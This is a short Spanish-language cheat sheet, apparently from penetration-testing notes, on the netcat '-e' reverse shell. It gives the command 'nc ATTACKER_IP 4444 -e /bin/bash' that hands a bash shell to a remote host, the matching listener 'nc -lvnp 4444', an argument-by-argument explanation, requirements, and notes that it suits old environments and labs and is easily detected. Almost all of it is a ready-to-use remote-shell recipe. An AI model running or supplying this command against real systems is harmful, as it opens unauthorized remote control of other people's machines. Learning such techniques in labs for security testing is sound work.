# Netcat Reverse Shell — -e Option

## Descripción

La opción `-e` permite ejecutar directamente un programa cuando se establece la conexión.

---

# Comando

```bash
nc ATTACKER_IP 4444 -e /bin/bash
```

---

# Listener

```bash
nc -lvnp 4444
```

---

# Requisitos

* netcat con soporte `-e`
* shell bash disponible

---

# Explicación

```
nc             → netcat
ATTACKER_IP    → IP atacante
4444           → puerto
-e /bin/bash   → ejecuta bash
```

---

# Cuándo usarlo

* entornos antiguos
* laboratorios

---

# Limitaciones

* opción eliminada en versiones modernas
* altamente detectable
